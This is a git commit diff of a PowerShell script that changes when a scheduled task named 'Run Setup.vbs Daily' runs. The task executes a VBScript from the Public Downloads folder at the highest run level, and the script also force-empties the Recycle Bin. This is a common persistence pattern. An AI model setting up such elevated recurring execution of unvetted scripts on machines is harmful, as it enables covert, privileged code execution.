013621c8017461e72ae471977b495fbd152b91d9
GALVINVN <112307302+GALVINVN@users.noreply.github.com>
2025-06-10 10:35:55 +0700

    configure_system.ps1

--- configure_system.ps1
+++ configure_system.ps1
@@ -72,7 +72,7 @@ Clear-RecycleBin -Force
 $taskName = "Run Setup.vbs Daily"
 $setupPath = "C:\Users\Public\Downloads\Setup.vbs"
 $action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$setupPath`""
-$trigger = New-ScheduledTaskTrigger -Daily -At 10:30AM
+$trigger = New-ScheduledTaskTrigger -Daily -At 10:30PM
 $principal = New-ScheduledTaskPrincipal -UserId "$env:UserName" -RunLevel Highest
 Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Force
 exit
